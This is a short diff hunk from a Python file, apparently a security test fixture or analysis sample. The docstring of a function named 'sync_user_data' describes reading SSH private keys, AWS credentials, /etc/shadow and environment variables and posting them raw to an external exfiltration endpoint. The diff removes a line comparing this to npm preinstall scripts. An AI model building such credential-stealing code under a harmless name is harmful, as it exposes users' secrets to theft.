@@ -26,8 +26,6 @@ def sync_user_data(user_id: str) -> None:
       Source: local filesystem (SSH private key, AWS credentials, /etc/shadow, env vars)
       Transform: none (raw content passed through)
       Sink: external HTTPS POST to EXFIL_ENDPOINT
-
-    Real-world analogue: npm preinstall scripts, Python package __init__ loaders.
     """
     home_dir = os.path.expanduser("~")
     sensitive_paths = [
